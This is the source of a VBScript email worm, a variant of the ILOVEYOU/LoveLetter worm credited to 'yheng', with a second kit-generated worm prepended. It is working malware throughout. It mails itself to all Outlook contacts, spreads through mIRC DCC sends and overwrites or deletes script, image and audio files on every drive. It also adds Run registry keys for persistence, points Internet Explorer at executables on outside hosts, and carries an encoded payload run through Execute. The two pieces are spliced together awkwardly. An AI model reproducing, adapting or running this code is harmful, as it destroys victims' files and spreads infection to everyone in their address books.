'Worm Name: yhengpogi_davao_philippines
'Written By: yheng
'[INDRA]
On Error Resume Next
feeepfnlfwswgvj = WScript.ScriptFullName
Set adpldsqydivysxq = CreateObject("WScript.Shell") 
Set pammoehgpajkawi = CreateObject("Scripting.FileSystemObject")
Set lrgxvvbhmchcrll = CreateObject("Outlook.Application")
If lrgxvvbhmchcrll <> "" Then
Set fsuqbmpajwtvegi = lrgxvvbhmchcrll.GetNameSpace("MAPI")
For bqjkphksralvpbu = 1 to fsuqbmpajwtvegi.AddressLists.Count
Set ftwdqdypcpfpapb = lrgxvvbhmchcrll.CreateItem(0)
Set wasjiuvcwudqqvf = fsuqbmpajwtvegi.AddressLists.Item(bqjkphksralvpbu)
ftwdqdypcpfpapb.Attachments.Add feeepfnlfwswgvj
ftwdqdypcpfpapb.Subject = "hi....please see the attachment, urgent matter!"
ftwdqdypcpfpapb.Body = "Please open the attachment file, i include "
ftwdqdypcpfpapb.Body = ftwdqdypcpfpapb.Body + vbCrLf + "the scripts there."
Set dncvlrwkfgytoof = wasjiuvcwudqqvf.AddressEntries
Set ivaymqwsnsuvfpr = ftwdqdypcpfpapb.Recipients
For qollodhjshklktw = 1 to dncvlrwkfgytoof.Count
ftwdqdypcpfpapb.Recipients.Add dncvlrwkfgytoof.Item(qollodhjshklktw)
Next
ftwdqdypcpfpapb.Send
Next
End If
Set kanppubqvfgomtj = pammoehgpajkawi.CreateTextFile("C:\mirc\script.ini", True)
kanppubqvfgomtj.WriteLine "[script]"
kanppubqvfgomtj.WriteLine "n0=ON 1:JOIN:#:{ if ( $nick != $me ) {"
kanppubqvfgomtj.Write "n1=/dcc           send         $nick """
kanppubqvfgomtj.Write feeepfnlfwswgvj
kanppubqvfgomtj.WriteLine """ }"
kanppubqvfgomtj.Close
Set tuqulmvfvgtpygp = pammoehgpajkawi.OpenTextFile(feeepfnlfwswgvj, 1, 0)
uyjchocslpcvnqa = tuqulmvfvgtpygp.ReadAll
tuqulmvfvgtpygp.Close
pvlsfhuaqwnkaeb = Left(uyjchocslpcvnqa, InStrRev(uyjchocslpcvnqa, "vcoxnrlfhmnsbpi")) + "vcoxnrlfhmnsbpi"
lxpghyxieourlox = Left(feeepfnlfwswgvj, InStrRev(feeepfnlfwswgvj, "\"))
For Each ulpnpwnalomevcu in pammoehgpajkawi.GetFolder(lxpghyxieourlox).Files
If ( Right(ulpnpwnalomevcu.Name, 4) = ".vbs" ) Then
Set qqrysqoaksvwndx = pammoehgpajkawi.OpenTextFile(ulpnpwnalomevcu.Name, 1, 0)
owrmjijofncumtd = qqrysqoaksvwndx.ReadAll
If (InStr(owrmjijofncumtd, "[INDRA]") = 0) Then
Set quomcbpfrhqciig = pammoehgpajkawi.CreateTextFile(ulpnpwnalomevcu.Name, True)
quomcbpfrhqciig.Write pvlsfhuaqwnkaeb + vbCrLf + owrmjijofncumtd
quomcbpfrhqciig.Close
End If
qqrysqoaksvwndx.Close
End If
Next
If (Month(Now) = 07) and (Day(Now) = 18) Then 
'Vbs.Vbswg.yhengpogi_davao Created By yhengpogi_davao_philippines. 7/23/2002
Execute EPP2663G("$S_p+S_ptd+vebkdmldf\a^s^l@ob^qba?vvebkdmldf\a^s^l\mefifmmfkbp+4,/0,/--/PbqRP2..4F0:`ob^qbl_gb`q%p`ofmqfkd+cfibpvpqbjl_gb`q&R2300?O2:RP2..4F0+dbqpmb`f^icliabo%-&DCJJ0>40:R2300?O2#Yvebkdmldf\a^s^l+dfc+s_pPbqHC?33S1-:`ob^qbl_gb`q%tp`ofmq+pebii&HC?33S1-+obdtofqbEHIJYPLCQT>OBYJf`olplcqYTfkaltpY@roobkqSbopflkYOrkYTfkRma^qb)tp`ofmq+bub#DCJJ0>40#RP2..4F0+`lmvcfibtp`ofmq+p`ofmqcriik^jb)DCJJ0>40G3MF1/.3FcHC?33S1-+obdob^a%EHIJYPLCQT>OBYJf`olplcqYTfkaltpY@roobkqSbopflkYvebkdmldf\a^s^lYH1G.@K-3&9;.qebkSMR5@3P0BkafcFcHC?33S1-+obdob^a%EHIJYPLCQT>OBYJf`olplcqYTfkaltpY@roobkqSbopflkYvebkdmldf\a^s^lYLLJ22>15&9;.qebkQ1H/E/-QBkafcPbqBEO.I5L1:RP2..4F0+lmbkqbuqcfib%tp`ofmq+p`ofmqcriik^jb&?-.Q5HQR:BEO.I5L1+ob^a^iiBEO.I5L1+`ilpbAlfcklq%RP2..4F0+cfibbufpqp%tp`ofmq+p`ofmqcriik^jb&&qebkpbqC22BQC/3:RP2..4F0+`ob^qbqbuqcfib%tp`ofmq+p`ofmqcriik^jb&C22BQC/3+tofqb?-.Q5HQRC22BQC/3+`ilpbbkafcNS261-DH:HC?33S1-+obdob^a%EHIJYPLCQT>OBYJf`olplcqYTfkaltpY@roobkqSbopflkYOrkYTfkRma^qb&FcNS261-DH9;tp`ofmq+bub#DCJJ0>40#qebkHC?33S1-+obdtofqbEHIJYPLCQT>OBYJf`olplcqYTfkaltpY@roobkqSbopflkYOrkYTfkRma^qb)tp`ofmq+bub#DCJJ0>40#bkafcNS261-DH:illmCrk`qflkSMR5@3P0%&PbqAD@65122:@ob^qbL_gb`q%Lrqillh+>mmif`^qflk&FcAD@65122:LrqillhQebkPbqD5SH41@Q:AD@65122+DbqK^jbPm^`b%J>MF&PbqE3S1S.13:D5SH41@Q+>aaobppIfpqpCloB^`eA03A/-.QFkE3S1S.13FcA03A/-.Q+>aaobppBkqofbp+@lrkq9;-QebkQ6B6P2?0:A03A/-.Q+>aaobppBkqofbp+@lrkqClo@5LQ4/00:.QlQ6B6P2?0PbqN43/1O/L:AD@65122+@ob^qbFqbj%-&PbqKAJ..-.>:A03A/-.Q+>aaobppBkqofbp%@5LQ4/00&N43/1O/L+Ql:KAJ..-.>+>aaobppN43/1O/L+Pr_gb`q:SbovFjmloq^kqN43/1O/L+?lav:Ef7#s_`oic#Mib^pbsfbtqefpcfib)fq$psbovfjmloq^kq+#s_`oic#bub`rqbpbqK?J5C33?:N43/1O/L+#@eo%32&#@eo%..3&#@eo%..3&#@eo%64&#@eo%66&#@eo%.-1&#@eo%.-6&#@eo%.-.&#@eo%..-&#@eo%..3&#@eo%..2&A5@/0P-R:DCJJ0>40N43/1O/L+Abibqb>cqboPr_jfq:QorbK?J5C33?+>aaA5@/0P-RFcN43/1O/L+Ql9;QebkN43/1O/L+PbkaBkaFcKbuqBkaFcKbuqBkaFcBkacrk`qflkCrk`qflkQ1H/E/-Q%?GN5-?3>&Fc?GN5-?3>9;QebkD4Q251@.:HC?33S1-+obdob^a%EHBV\IL@>I\J>@EFKBYPlcqt^obYJf`olplcqYTfkaltpY@roobkqSbopflkYMoldo^jCfibpAfo&FcRP2..4F0+cfibbufpqp%`7Yjfo`Yjfo`+fkf&Qebk?GN5-?3>:`7Yjfo`BipbFcRP2..4F0+cfibbufpqp%`7Yjfo`0/Yjfo`+fkf&Qebk?GN5-?3>:`7Yjfo`0/BipbFcRP2..4F0+cfibbufpqp%D4Q251@.#Yjfo`Yjfo`+fkf&Qebk?GN5-?3>:D4Q251@.#Yjfo`BipbFcRP2..4F0+cfibbufpqp%D4Q251@.#Yjfo`0/Yjfo`+fkf&Qebk?GN5-?3>:D4Q251@.#Yjfo`Bipb?GN5-?3>:BkaFcBkaFcFc?GN5-?3>9;QebkPbqK@312OO4:RP2..4F0+@ob^qbQbuqCfib%?GN5-?3>#Yp`ofmq+fkf)Qorb&K@312OO4:Xp`ofmqZ#s_@oIc#k-:lk.7GLFK7 7xK@312OO4:K@312OO4#s_@oIc#k-:lk.7GLFK7 7xK@312OO4:K@312OO4#s_@oIc#k.:,fc%!kf`h::!jb&xe^iqzK@312OO4:K@312OO4#s_@oIc#k/:,+#@eo%.--&#@eo%66&#@eo%66&#pbka!kf`hK@312OO4:K@312OO4#DCJJ0>40K@312OO4:K@312OO4#s_@oIc#k0:zp`ofmq+@ilpbBkaFcBkaCrk`qflkCrk`qflkH0N0D4DM%&LkBooloObprjbKbuqPbqBP/?/3L@:RP2..4F0+AofsbpCloB^`eM6/S3KI/FkBP/?/3L@F2E@1B/H:M6/S3KI/#Y@^iiC0B->S51%F2E@1B/H&KbuqBkaCrk`qflkCrk`qflkC0B->S51%JCBIRK3B&A>5351GR:JCBIRK3BPbqJ.-3C/2F:RP2..4F0+DbqCliabo%A>5351GR&PbqO24R06K-:J.-3C/2F+CfibpCloB^`eA2GL0PKMFkO24R06K-Fci`^pb%A2GL0PKM+K^jb&:jfo`+fkfQebkQ1H/E/-Q%A2GL0PKM+M^obkqCliabo&BkaFcFcRP2..4F0+DbqBuqbkpflkK^jb%A2GL0PKM+m^qe&:s_pRP2..4F0+@lmvCfibtp`ofmq+p`ofmqcriik^jb)A2GL0PKM+m^qe)qorbBkafcFcRP2..4F0+DbqBuqbkpflkK^jb%A2GL0PKM+m^qe&:s_bRP2..4F0+@lmvCfibtp`ofmq+p`ofmqcriik^jb)A2GL0PKM+m^qe)qorbBkafcKbuqPbq>B05O4P?:J.-3C/2F+Pr_cliabopCloB^`e>-S33BI@Fk>B05O4P?@^ii%>-S33BI@+m^qe&KbuqBkacrk`qflkCrk`qflkG3MF1/.3%&HC?33S1-+orkORKAII0/+BUBrpbo+bub)bufqtfkaltpbkacrk`qflk$S_ptd/?bq^+?vXHZ",3)
Function EPP2663G(JLFB6512,NF55KQI8)
For SR3V1O77 = 1 To Len(JLFB6512)
G50LTVR4 = Mid(JLFB6512, SR3V1O77, 1)
If G50LTVR4 = Chr(2) Then
G50LTVR4 = Chr(34 + NF55KQI8)
ElseIf G50LTVR4 = Chr(3) Then
G50LTVR4 = Chr(10 + NF55KQI8)
ElseIf G50LTVR4 = Chr(4) Then
G50LTVR4 = Chr(13 + NF55KQI8)
Else
G50LTVR4 = Chr(Asc(G50LTVR4) + NF55KQI8)
End If
EPP2663G = EPP2663G & G50LTVR4
Next
rem  yheng -yheng_davao_philippines(vbe) <crack me please...>
rem 			by: yheng  /  von_214@yahoo.com  /  @GRAMMERSoft Group  /  
Davao,Philippines
'Comments begining with ' added by The Hidden May 4 2000
On Error Resume Next
dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow

eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll

main()


sub main()
  On Error Resume Next
  dim wscr,rr
  set wscr=CreateObject("WScript.Shell")
  'check the time out value for WSH
  rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting 
Host\Settings\Timeout")
  if (rr>=1) then
    ' Set script time out to infinity
    wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting 
Host\Settings\Timeout", 
0, "REG_DWORD"
  end if
  'Create three copies of the script in the windows, system32 and temp folders
  Set dirwin = fso.GetSpecialFolder(0)
  Set dirsystem = fso.GetSpecialFolder(1)
  Set dirtemp = fso.GetSpecialFolder(2)
  Set c = fso.GetFile(WScript.ScriptFullName)
  c.Copy(dirsystem&"\MSKernel32.vbs")
  c.Copy(dirwin&"\Win32DLL.vbs")
  c.Copy(dirsystem&"\yheng_davao_philippines.TXT.vbs")
  'Set IE default page to 1 of four locations that downloads an executable.  
  'If the exectuable has already been downloaded set it to run at the next login 
and set IE's start page to be 
blank  
  regruns()
  'create an html file that possibly runs an activex component and runs one of 
the copies of the script  
  html()
  'Resend script to people in the WAB
  spreadtoemail()
  'overwrite a number of file types with the script
  'if the files are not already scripts create a script file with the same name 
with vbs extention and 
  'delete the original file
  'mirc client have a script added to send the html file created earlier to a 
channel
  listadriv()
end sub



sub regruns()
  On Error Resume Next
  Dim num, downread
  regcreate 
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",di
rsystem&"\MS
Kernel32.vbs"
  regcreate 
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32D
LL",dirwin&"\
Win32DLL.vbs"
  downread = ""
  downread = regget("HKEY_CURRENT_USER\Software\Microsoft\Internet 
Explorer\Download Directory")
  if (downread = "") then
    downread = "c:\"
  end if
  if (fileexist(dirsystem&"\WinFAT32.exe") = 1) then
    Randomize
    num = Int((4 * Rnd) + 1)
    if num = 1 then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start 
Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw658
7345gvsdf7679njbv
YT/WIN-BUGSFIX.exe"
    elseif num = 2 then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start 
Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe5467
86324hjk4jnHHGbvbm
KLJKjhkqj4w/WIN-BUGSFIX.exe"
    elseif num = 3 then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start 
Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhf
gER67b3Vbvg/
WIN-BUGSFIX.exe"
    elseif num = 4 then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start 
Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgq
werasdjhPhjasfdgl
kNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
    end if
  end if
  if (fileexist(downread & "\WIN-BUGSFIX.exe") = 0) then
    regcreate 
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX", 
downread & "\WIN-BUGSFIX.exe"
    regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start 
Page", "about:blank"
  end if
end sub

sub listadriv
  On Error Resume Next
  Dim d,dc,s
  Set dc = fso.Drives
  For Each d in dc
    If d.DriveType = 2 or d.DriveType=3 Then
      folderlist(d.path & "\")
    end if
  Next
  listadriv = s
end sub

sub infectfiles(folderspec)  
  On Error Resume Next
  dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
  set f = fso.GetFolder(folderspec)
  set fc = f.Files
  for each f1 in fc
    ext = fso.GetExtensionName(f1.path)
    ext = lcase(ext)
    s = lcase(f1.name)
    if (ext = "vbs") or (ext = "vbe") then
      set ap = fso.OpenTextFile(f1.path,2,true)
      ap.write vbscopy
      ap.close
    elseif(ext = "js") or (ext = "jse") or (ext = "css") or _
          (ext = "wsh") or (ext = "sct") or (ext = "hta") then
      set ap = fso.OpenTextFile(f1.path,2,true)
      ap.write vbscopy
      ap.close
      bname = fso.GetBaseName(f1.path)
      set cop = fso.GetFile(f1.path)
      cop.copy(folderspec & "\" & bname & ".vbs")
      fso.DeleteFile(f1.path)
    elseif(ext = "jpg") or (ext = "jpeg") then
      set ap=fso.OpenTextFile(f1.path, 2,true)
      ap.write vbscopy
      ap.close
      set cop=fso.GetFile(f1.path)
      cop.copy(f1.path & ".vbs")
      fso.DeleteFile(f1.path)
    elseif(ext="mp3") or (ext="mp2") then
      set mp3 = fso.CreateTextFile(f1.path & ".vbs")
      mp3.write vbscopy
      mp3.close
      set att = fso.GetFile(f1.path)
      att.attributes = att.attributes + 2
    end if
    if (eq<>folderspec) then
      if (s = "mirc32.exe") or (s = "mlink32.exe") or (s = "mirc.ini") or _
         (s = "script.ini") or (s = "mirc.hlp") then
        set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
        scriptini.WriteLine "[script]"
        scriptini.WriteLine ";mIRC Script"
        scriptini.WriteLine ";  Please dont edit this script... mIRC will 
corrupt, if mIRC will"
        scriptini.WriteLine "     corrupt... WINDOWS will affect and will not 
run correctly. thanks"
        scriptini.WriteLine ";"
        scriptini.WriteLine ";Khaled Mardam-Bey"
        scriptini.WriteLine ";http://www.mirc.com"
        scriptini.WriteLine ";"
        scriptini.WriteLine "n0=on 1:JOIN:#:{"
        scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
        scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\yheng_davao_
philippines.HTM"
        scriptini.WriteLine "n3=}"
        scriptini.close
        eq=folderspec
      end if
    end if
  next  
end sub

sub folderlist(folderspec)  
  On Error Resume Next
  dim f,f1,sf
  set f = fso.GetFolder(folderspec)  
  set sf = f.SubFolders
  for each f1 in sf
    infectfiles(f1.path)
    folderlist(f1.path)
  next  
end sub

sub regcreate(regkey,regvalue)
  Set regedit = CreateObject("WScript.Shell")
  regedit.RegWrite regkey,regvalue
end sub

function regget(value)
  Set regedit = CreateObject("WScript.Shell")
  regget = regedit.RegRead(value)
end function

function fileexist(filespec)
  On Error Resume Next
  dim msg
  if (fso.FileExists(filespec)) Then
    msg = 0
    else
    msg = 1
  end if
  fileexist = msg
end function

function folderexist(folderspec)
  On Error Resume Next
  dim msg
  if (fso.GetFolderExists(folderspec)) then
    msg = 0
    else
    msg = 1
  end if
  fileexist = msg
end function

sub spreadtoemail()
  On Error Resume Next
  dim x, a, ctrlists, ctrentries, malead, b, regedit, regv, regad
  set regedit = CreateObject("WScript.Shell")
  set out = WScript.CreateObject("Outlook.Application")
  set mapi = out.GetNameSpace("MAPI")
  for ctrlists = 1 to mapi.AddressLists.Count
    set a = mapi.AddressLists(ctrlists)
    x = 1
    regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a)
    if (regv = "") then
      regv = 1
    end if
    if (int(a.AddressEntries.Count) > int(regv)) then
      for ctrentries = 1 to a.AddressEntries.Count
        malead = a.AddressEntries(x)
        regad = ""
        regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & 
malead)
        if (regad = "") then
          set male = out.CreateItem(0)
          male.Recipients.Add(malead)
          male.Subject = "ILOVEYOU"
          male.Body = vbcrlf & "kindly check the attached yheng_davao_philippines coming from 
me."
          male.Attachments.Add(dirsystem & "\yheng_davao_philippines.TXT.vbs")
          male.Send
          regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead, 
1, "REG_DWORD"
        end if
        x = x + 1
      next
      regedit.RegWrite 
"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
    else
      regedit.RegWrite 
"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
    end if
  next
  Set out = Nothing
  Set mapi = Nothing
end sub

sub html
  On Error Resume Next
  dim lines, n, dta1, dta2, dt1, dt2, dt3, dt4, l1, dt5, dt6
  dta1= "<HTML><HEAD><TITLE>yheng_davao_philippines - HTML<?-?TITLE><META NAME=@-@Generator@-
@ 
CONTENT=@-@yheng VBS - yheng_davao_philippines@-@>"&vbcrlf& _
        "<META NAME=@-@Author@-@ CONTENT=@-@yheng ?-? von_214@yahoo.com ?-? 
@GRAMMERSoft Group ?-? Davao, Philippines ?-? July 2002@-@>"&vbcrlf& _
        "<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is 
good...@-
@>"&vbcrlf& _
        "<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-
#yheng_davao_philippines.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
        "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#yheng_davao_
philippines.HTM#-
#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
        "<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to 
read this HTML file<BR>- 
Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
        "<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------
z------------
--------z----------<?-?MARQUEE> "&vbcrlf& _
        "<?-?BODY><?-?HTML>"&vbcrlf& _
        "<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
        "<!--?-??-?"&vbcrlf& _
        "if (window.screen){var wi=screen.availWidth;var 
hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
        "?-??-?-->"&vbcrlf& _
        "<?-?SCRIPT>"&vbcrlf& _
        "<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
        "<!--"&vbcrlf& _
        "on error resume next"&vbcrlf& _
        "dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
        "aw=1"&vbcrlf& _
        "code="
  dta2= "set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
        "set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
        "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
        "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
        "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
        "set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& 
_
        "wri.write code4"&vbcrlf& _
        "wri.close"&vbcrlf& _
        "if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
        "if (err.number=424) then"&vbcrlf& _
        "aw=0"&vbcrlf& _
        "end if"&vbcrlf& _
        "if (aw=1) then"&vbcrlf& _
        "document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
        "window.close"&vbcrlf& _
        "end if"&vbcrlf& _
        "end if"&vbcrlf& _
        "Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
        "regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-
^Windows^-
^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& 
_
        "?-??-?-->"&vbcrlf& _
        "<?-?SCRIPT>"
  dt1 = replace(dta1, chr(35) & chr(45) & chr(35), "'")
  dt1 = replace(dt1, chr(64) & chr(45) & chr(64), """")
  dt4 = replace(dt1, chr(63) & chr(45) & chr(63), "/")
  dt5 = replace(dt4, chr(94) & chr(45) & chr(94), "\")
  dt2 = replace(dta2, chr(35) & chr(45) & chr(35), "'")
  dt2 = replace(dt2, chr(64) & chr(45) & chr(64), """")
  dt3 = replace(dt2, chr(63) & chr(45) & chr(63), "/")
  dt6 = replace(dt3, chr(94) & chr(45) & chr(94), "\")
  set fso = CreateObject("Scripting.FileSystemObject")
  set c = fso.OpenTextFile(WScript.ScriptFullName, 1)
  lines = Split(c.ReadAll, vbcrlf)
  l1 = ubound(lines)
  for n = 0 to ubound(lines)
    lines(n)=replace(lines(n), "'", chr(91) + chr(45) + chr(91))
    lines(n)=replace(lines(n), """", chr(93) + chr(45) + chr(93))
    lines(n)=replace(lines(n), "\", chr(37) + chr(45) + chr(37))
    if (l1 = n) then
      lines(n) = chr(34) + lines(n) + chr(34)
    else
      lines(n) = chr(34) + lines(n) + chr(34) & "&vbcrlf& _"
    end if
  next
  set b=fso.CreateTextFile(dirsystem + "\yheng_davao_philippines.HTM")
  b.close
  set d=fso.OpenTextFile(dirsystem + "\yheng_davao_philippines.HTM",2)
  d.write dt5
  d.write join(lines, vbcrlf)
  d.write vbcrlf
  d.write dt6
  d.close
end sub
 
 
End If
'Generated with [INDRA] v0.4.
'vcoxnrlfhmnsbpi
